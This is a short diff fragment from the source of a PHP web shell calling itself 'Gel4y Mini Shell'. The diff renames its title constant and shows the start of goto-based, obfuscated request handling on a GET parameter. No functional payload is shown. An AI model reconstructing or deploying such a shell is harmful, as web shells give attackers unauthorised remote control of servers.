@@ -1,5 +1,5 @@
 <?php
-define("FuE", "Gel4y Mini Shell");
+define("FuE", "Gel4y Mini Shells");
 if (isset($_GET['l'])) {
     goto GrS;
 }
